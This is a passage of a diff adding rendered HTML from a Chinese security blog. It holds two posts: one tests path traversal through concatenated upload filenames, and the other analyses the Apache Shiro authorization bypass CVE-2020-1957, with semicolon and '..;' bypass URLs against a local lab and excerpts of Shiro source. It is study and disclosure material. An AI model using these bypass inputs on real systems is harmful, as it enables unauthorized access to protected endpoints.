+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avator.jpg">
+      <meta itemprop="name" content="ttestoo">
+      <meta itemprop="description" content="不争">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ttestoo's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%90%8D%E6%8B%BC%E6%8E%A5%E5%9C%BA%E6%99%AF/" class="post-title-link" itemprop="url">文件上传-文件名拼接场景</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-10-23 15:34:53" itemprop="dateCreated datePublished" datetime="2021-10-23T15:34:53+08:00">2021-10-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-22 16:12:24" itemprop="dateModified" datetime="2022-01-22T16:12:24+08:00">2022-01-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" itemprop="url" rel="index"><span itemprop="name">文件上传</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/Java-Sec/" itemprop="url" rel="index"><span itemprop="name">Java Sec</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>业务中发现上传文件将随机值和原始文件名拼接后的结果作为保存的文件名，那么这种场景下是否可通过在文件名中加”/“进行路径穿越写文件呢？</p>
+<h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><p>模拟文件名拼接场景下的文件上传代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&#123;&quot;/upload9&quot;&#125;)</span></span><br><span class="line">   <span class="meta">@ResponseBody</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">uploadPic</span><span class="params">(<span class="meta">@RequestParam</span> MultipartFile file)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (file == <span class="keyword">null</span> || file.isEmpty()) &#123;</span><br><span class="line">           log.error(<span class="string">&quot;上传文件为空&quot;</span>);</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;上传文件为空&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       String fileName = file.getOriginalFilename();   <span class="comment">//原始文件名</span></span><br><span class="line">       String lowerCaseFileName = fileName.toLowerCase();</span><br><span class="line">       <span class="comment">// 模拟简单的后缀白名单校验</span></span><br><span class="line">       <span class="keyword">if</span> (!lowerCaseFileName.endsWith(<span class="string">&quot;.jpg&quot;</span>) &amp;&amp; !lowerCaseFileName.endsWith(<span class="string">&quot;.png&quot;</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;不支持的图片类型&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       String targetFileName = UUID.randomUUID().toString().replaceAll(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;_&quot;</span> + fileName;     <span class="comment">//拼接文件名</span></span><br><span class="line"></span><br><span class="line">       LocalDate now = LocalDate.now();</span><br><span class="line">       String middlePath = <span class="string">&quot;&quot;</span> + now.getYear() + now.getMonth() + File.separator + now.getDayOfMonth() + File.separator;    <span class="comment">//中间路径，主要按照日期分开</span></span><br><span class="line">       <span class="comment">// System.out.println(path + File.separator + middlePath);</span></span><br><span class="line">       String targetPath = path + File.separator + middlePath;  <span class="comment">//最终保存路径</span></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 这里使用FileUtils.writeByteArrayToFile写文件，写文件方式不影响本次问题</span></span><br><span class="line">           FileUtils.writeByteArrayToFile(<span class="keyword">new</span> File(targetPath, targetFileName), file.getBytes());</span><br><span class="line">           log.info(<span class="string">&quot;文件上传成功：&quot;</span> + targetPath + targetFileName);</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;文件上传成功：&quot;</span> + targetPath + targetFileName;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">           log.error(e.toString());</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;文件上传失败&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>1、当文件名为：/a/b/1.png 时，完整文件名为：/Users/alien/test/2021DECEMBER/22/fdc2a357276141b599ed708ad0071db0_/a/b/1.png</p>
+<p><img src="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%90%8D%E6%8B%BC%E6%8E%A5%E5%9C%BA%E6%99%AF/1640173585786-06364e66-1c57-48aa-aaa5-4f9c03b350e8.png" alt="img"></p>
+<p>此时将创建所有文件路径并成功上传文件（可造成大量脏路径）：</p>
+<p><img src="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%90%8D%E6%8B%BC%E6%8E%A5%E5%9C%BA%E6%99%AF/1640173763740-4ebec977-577b-467c-a910-839c5182fd16.png" alt="img"></p>
+<p>2、当文件名中包含../时，例如为：/a/b/../1.png，则在java.io.File#mkdirs创建路径时将会处理../，并创建最终所需的路径：</p>
+<p><img src="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%90%8D%E6%8B%BC%E6%8E%A5%E5%9C%BA%E6%99%AF/1640173983039-3a62ab02-600a-4d8b-81d4-af4d97ee87ba.png" alt="img"></p>
+<p>注意这里不会创建被../抵消掉的路径，即不会创建/b路径：</p>
+<p><img src="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%90%8D%E6%8B%BC%E6%8E%A5%E5%9C%BA%E6%99%AF/1640174112113-ba63ca36-4930-4736-a7a7-d314c96d802b.png" alt="img"></p>
+<p>创建路径之后，将会创建java.io.FileOutputStream实例化对象供下一步用来写数据，但是实例化FileOutputStream时，此时file对象为完整的文件路径：/Users/alien/test/2021DECEMBER/22/c52cdbcc1c594af389450002702bccc3_/a/b/../1.png</p>
+<p><img src="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%90%8D%E6%8B%BC%E6%8E%A5%E5%9C%BA%E6%99%AF/1640174333492-5105bccf-4235-4d19-80b2-0ecc3fb1e810.png" alt="img"></p>
+<p><img src="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%90%8D%E6%8B%BC%E6%8E%A5%E5%9C%BA%E6%99%AF/1640174369303-574f9f0b-b322-4355-87c9-feacec714a22.png" alt="img"></p>
+<p>而对于java.io.FileOutputStream#open方法，会按照路径一步一步的寻找，当找到/b路径时将报错java.io.FileNotFoundException#FileNotFoundException：</p>
+<p><img src="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%90%8D%E6%8B%BC%E6%8E%A5%E5%9C%BA%E6%99%AF/1640174462755-e968221e-71fb-422b-a07e-75882b1004d4.png" alt="img"></p>
+<p><img src="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%90%8D%E6%8B%BC%E6%8E%A5%E5%9C%BA%E6%99%AF/1640174629209-a230a5ad-813f-4ce8-9921-ac18f1b9fb6a.png" alt="img"></p>
+<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>当随机值+原始文件名拼接的方式保存文件时，想要通过../进行路径穿越写文件是不成功的（这里我尝试了多种写文件的方式，最终都是通过java.io.File和java.io.FileOutputStream处理的）。</p>
+<p>补充：</p>
+<p>当文件名不包含随机值时，在文件上传时文件名中不能加不存在的路径然后../给抵消掉，只能存在的路径进行../，因为在java.io.File#isDirectory中判断时不存在路径会返回false，最终抛出IOException异常（不同写法可能不同，未验证）；</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -359,6 +899,642 @@
   
   
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ttestoo.github.io/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avator.jpg">
+      <meta itemprop="name" content="ttestoo">
+      <meta itemprop="description" content="不争">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ttestoo's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Shiro权限绕过漏洞分析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-09-08 23:03:39" itemprop="dateCreated datePublished" datetime="2021-09-08T23:03:39+08:00">2021-09-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-22 16:11:08" itemprop="dateModified" datetime="2022-01-22T16:11:08+08:00">2022-01-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Shiro/" itemprop="url" rel="index"><span itemprop="name">Shiro</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Shiro/Java-Sec/" itemprop="url" rel="index"><span itemprop="name">Java Sec</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>15k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>13 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间遇到通过分号绕过nginx层屏蔽并顺利访问到Springboot项目actuator端点的问题，修复过程中偶然发现当项目使用shiro组件时，若将shiro升级到1.6.0可间接修复分号绕过的问题，当请求url中包含分号时响应状态码为400；</p>
+<p>考虑到shiro主要用来执行身份验证授权等，理论上不适合直接阻断存在分号的请求；</p>
+<p>为搞明白此问题，决定对shiro的权限校验问题进行整理学习，下面为常见的shiro权限绕过漏洞分析修复过程。</p>
+<blockquote>
+<p>文章首发于安全客：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253749">https://www.anquanke.com/post/id/253749</a></p>
+</blockquote>
+<h1 id="Shiro-Filter"><a href="#Shiro-Filter" class="headerlink" title="Shiro Filter"></a>Shiro Filter</h1><p>学习shiro权限绕过漏洞之前，有必要了解下shiro filter的过滤过程；</p>
+<p>一个http请求过来，首先经过web容器的处理（这里默认为tomcat）被投放到相应的web应用，web应用会通过过滤器Filter链式的对http请求进行预处理，这里将会经过shiro的Filter（SpringShiroFilter）处理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.core.ApplicationFilterChain#internalDoFilter --&gt; org.apache.shiro.web.servlet.OncePerRequestFilter#doFilter		--&gt;    </span><br><span class="line">org.apache.shiro.web.servlet.AbstractShiroFilter#doFilterInternal  --&gt;</span><br><span class="line">org.apache.shiro.web.servlet.AbstractShiroFilter#executeChain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630601325451-04629821-65ed-471b-947b-4c81084e2f7d.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630601529024-db7cbbd3-82f0-4a60-bbcc-02d89b72c644.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630739834223-12be9559-a876-4d95-9a34-ffca25c551d0.png" alt="img"></p>
+<p>shiro的Filter执行过会通过getExecutionChain()获取执行链并执行对应的doFilter函数：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630745912353-36615797-cdc2-4c85-9406-65cc1b36b08e.png" alt="img"></p>
+<p>重点在获取chain的org.apache.shiro.web.servlet.AbstractShiroFilter#getExecutionChain中；</p>
+<p>首先会尝试获取到在springboot启动时加载的shiro配置文件中配置的Shiro filterChains（resolver）并判断是否为null，当为null则返回原始过滤器链origChain，当不为空时则尝试通过org.apache.shiro.web.filter.mgt.FilterChainResolver#getChain方法根据当前请求的url使用Ant模式获取相应的拦截器链 FilterChain代理（resolved），否则返回原始过滤器链origChain：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> FilterChain <span class="title">getExecutionChain</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain origChain)</span> </span>&#123;</span><br><span class="line">    FilterChain chain = origChain;</span><br><span class="line"></span><br><span class="line">    FilterChainResolver resolver = getFilterChainResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="keyword">null</span>) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;No FilterChainResolver configured.  Returning original FilterChain.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> origChain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FilterChain resolved = resolver.getChain(request, response, origChain);</span><br><span class="line">    <span class="keyword">if</span> (resolved != <span class="keyword">null</span>) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Resolved a configured FilterChain for the current request.&quot;</span>);</span><br><span class="line">        chain = resolved;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;No FilterChain configured for the current request.  Using the default.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> chain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630602160374-5ee7637f-d8db-4fc6-942b-2a43bb7c84b5.png" alt="img"></p>
+<p>其中获取shiro对应的FilterChain代理是在org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain中完成，主要通过</p>
+<p>获取所有的filter链（filterChainManager）及requestURI，并循环遍历filterChainManager进行匹配，当匹配时则直接返回相对应的FilterChain代理，否则返回null：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630745201705-2b578d6d-186a-4b33-bdaa-6d76fd754fb0.png" alt="img"></p>
+<p>附上filterChainManager接口说明：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">FilterChainManager</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 得到注册的拦截器</span></span><br><span class="line">    <span class="function">Map&lt;String, Filter&gt; <span class="title">getFilters</span><span class="params">()</span></span>;</span><br><span class="line">       <span class="comment">// 获取拦截器链</span></span><br><span class="line">    <span class="function">NamedFilterList <span class="title">getChain</span><span class="params">(String chainName)</span></span>;</span><br><span class="line">    <span class="comment">// 是否有拦截器链</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">hasChains</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">// 得到所有拦截器链的名字</span></span><br><span class="line">    <span class="function">Set&lt;String&gt; <span class="title">getChainNames</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">// 使用指定的拦截器链代理原始拦截器链</span></span><br><span class="line">    <span class="function">FilterChain <span class="title">proxy</span><span class="params">(FilterChain original, String chainName)</span></span>;</span><br><span class="line">    <span class="comment">// 注册拦截器</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addFilter</span><span class="params">(String name, Filter filter)</span></span>;</span><br><span class="line">    <span class="comment">// 注册拦截器</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addFilter</span><span class="params">(String name, Filter filter, <span class="keyword">boolean</span> init)</span></span>;</span><br><span class="line">    <span class="comment">// 根据拦截器链定义创建拦截器链</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">createChain</span><span class="params">(String chainName, String chainDefinition)</span></span>;</span><br><span class="line">    <span class="comment">// 添加拦截器到指定的拦截器链</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addToChain</span><span class="params">(String chainName, String filterName)</span></span>;</span><br><span class="line">    <span class="comment">// 添加拦截器（带有配置的）到指定的拦截器链</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addToChain</span><span class="params">(String chainName, String filterName, String chainSpecificFilterConfig)</span> <span class="keyword">throws</span> ConfigurationException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最终链式执行过滤器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.core.ApplicationFilterChain#doFilter		--&gt;		org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630747870669-5bec76ce-d2b0-481c-9019-a801c96636db.png" alt="img"></p>
+<p>执行完过滤器后将调用servlet.service，进而执行controller解析及service等：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630747980904-c4effede-5d19-4eea-99b6-ff24130290fb.png" alt="img"></p>
+<p>javax.servlet.http.HttpServlet#service(javax.servlet.ServletRequest, javax.servlet.ServletResponse)：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630748012922-0ad22a7d-cb79-45c0-9f02-3df49c9d1309.png" alt="img"></p>
+<p>接下来的SpringMVC controller解析部分详情可参见下面CVE-2020-1957漏洞分析部分。</p>
+<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>可参考：<a target="_blank" rel="noopener" href="https://github.com/ttestoo/java-sec-study/tree/main/sec-shiro/java-shiro-bypass">https://github.com/ttestoo/java-sec-study/tree/main/sec-shiro/java-shiro-bypass</a></p>
+<h1 id="shiro权限绕过-CVE-2020-1957"><a href="#shiro权限绕过-CVE-2020-1957" class="headerlink" title="shiro权限绕过 CVE-2020-1957"></a>shiro权限绕过 CVE-2020-1957</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>Apache Shiro &lt; 1.5.2</p>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>1、正常情况下访问/hello/a会进行跳转：<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/hello/a">http://127.0.0.1:9091/hello/a</a></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630598417492-4561d4bc-9933-433f-957f-cc6ef78f13a6.png" alt="img"></p>
+<p>2、可通过分号进行绕过：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:9091/;/hello/a">http://127.0.0.1:9091/;/hello/a</a></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:9091/aa/..;test=123/admin/index">http://127.0.0.1:9091/aa/..;test=123/admin/index</a></p>
+<p>…</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630598478182-9242f04f-91cd-4862-9087-81641d6200a0.png" alt="img"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>shiro filter主要过程上述部分已简单介绍，其中根据分号绕过可初步判断问题可能出现在获取requestURI处，毕竟是拿requestURI和shiro配置的FilterChain进行匹配的，也就是说通过分号使得shiro filter过程的requestURI能绕过shiro的Ant格式的规则匹配；</p>
+<p>可以直接在org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain中的String requestURI = getPathWithinApplication(request); 处下断点进行调试：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630762530640-9240f5a9-83f9-41f9-9891-abf1a8248b5e.png" alt="img"></p>
+<p>注意这里测试过程中URL为：<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/aa/..;test=123/admin/index">http://127.0.0.1:9091/aa/..;test=123/admin/index</a></p>
+<p>跟进getPathWithinApplication函数，将通过WebUtils.<em>getPathWithinApplication –&gt;</em>  WebUtils.getRequestUri <em>获取requestURI：</em></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630762717437-9403cbc3-dd56-4bc4-8d51-7cb65e28b9ec.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630809693985-1a62aed9-2987-4f6c-8df6-b5492f8f5aea.png" alt="img"></p>
+<p>最终还是通过request.getRequestURI获取请求中的URI，即：/aa/..;test=123/admin/index</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630809932017-a60478de-c6e6-47f3-bc8f-25cc7b5a1d4d.png" alt="img"></p>
+<p>获取到请求中的URI后，将通过org.apache.shiro.web.util.WebUtils#normalize进行标准化处理，其中参数调用了decodeAndCleanUriString函数处理，在decodeAndCleanUriString中可以清晰的看到根据 ; 对uri进行了分割，并获取到 ; 之前的部分，即/aa/..</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630810346400-879eb414-cd8f-4130-a358-0315b2784e05.png" alt="img"></p>
+<p>且在normalize函数中，主要标准化处理内容如下：</p>
+<ul>
+<li><p>\ –&gt; /</p>
+</li>
+<li><p>// –&gt; /</p>
+</li>
+<li><p>/./ –&gt; /</p>
+</li>
+<li><p>/../ –&gt; /</p>
+</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">normalize</span><span class="params">(String path, <span class="keyword">boolean</span> replaceBackSlash)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a place for the normalized path</span></span><br><span class="line">        String normalized = path;</span><br><span class="line">		</span><br><span class="line">        <span class="keyword">if</span> (replaceBackSlash &amp;&amp; normalized.indexOf(<span class="string">&#x27;\\&#x27;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">            normalized = normalized.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (normalized.equals(<span class="string">&quot;/.&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add a leading &quot;/&quot; if necessary</span></span><br><span class="line">        <span 